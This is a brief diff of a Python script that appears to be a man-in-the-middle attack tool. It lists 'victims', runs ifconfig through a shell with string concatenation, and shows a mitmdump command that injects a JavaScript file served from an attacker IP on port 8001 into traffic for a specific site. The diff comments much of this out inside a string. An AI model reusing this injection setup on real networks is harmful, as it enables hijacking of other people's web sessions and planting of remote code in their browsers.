@@ -18,9 +18,9 @@ print("victims:")
 print(victims)
 
 
-#cmd = subprocess.Popen('ifconfig ' + interface, shell=True, stdout=subprocess.PIPE)
-#for line in cmd.stdout:
-
+cmd = subprocess.Popen('ifconfig ' + interface, shell=True, stdout=subprocess.PIPE).communicate()[0]
+print(cmd)
+"""
 def get_ip_address(ifname):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     return socket.inet_ntoa(fcntl.ioctl(
@@ -56,3 +56,4 @@ site = "212\.92\.30\.199"
 os.system("mitmdump -v --ignore '^(?!"+ site +")' -s 'injector.py http://" + attacker_ip + ":8001/script.js' -T") 
 
 
+"""
